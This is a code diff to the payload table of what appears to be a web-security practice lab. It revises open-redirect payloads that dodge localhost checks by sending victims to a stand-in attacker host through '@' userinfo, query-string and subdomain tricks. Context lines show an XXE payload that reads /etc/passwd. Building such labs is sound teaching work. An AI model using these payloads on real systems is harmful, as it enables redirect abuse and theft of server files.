@@ -156,9 +156,9 @@ function setLvl(card,lvl){
 }
 PAYLOADS.rd={
  easy:{p:"http://attacker.test/cb",n:"Easy — no validation; any host."},
- medium:{p:"http://localhost@attacker.test/cb",n:"Medium — must start with http://localhost → @ userinfo trick (real host = attacker.test)."},
- hard:{p:"http://localhost.attacker.test/cb",n:"Hard — '@' blocked → subdomain trick (host = localhost.attacker.test)."},
- expert:{p:"http://localhost.attacker.test/cb",n:"Expert — host-shape check; same subdomain works (real world: a parser differential)."}
+ medium:{p:"http://attacker.test/?x=localhost",n:"Medium — must CONTAIN 'localhost' → put it in the query (host stays attacker.test)."},
+ hard:{p:"http://localhost.attacker.test/cb",n:"Hard — must START WITH http://localhost → subdomain trick."},
+ expert:{p:"http://localhost@attacker/cb",n:"Expert — + no dots allowed → @ userinfo with a dotless host ('attacker')."}
 };
 PAYLOADS.xml={
  easy:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Easy — SYSTEM + file:// (needs php-xml installed)."},
